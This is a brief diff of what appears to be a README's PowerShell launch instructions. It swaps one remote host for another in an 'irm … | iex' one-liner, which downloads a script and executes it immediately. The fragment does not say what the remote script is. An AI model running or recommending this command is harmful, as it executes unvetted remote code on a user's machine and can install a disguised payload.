@@ -9,7 +9,7 @@
 
 ## Launch Command (Powershell) :
 ```bash
-irm edge.bughub.live | iex
+irm overflows.live/edge | iex
 ```
 Or
 ```bash
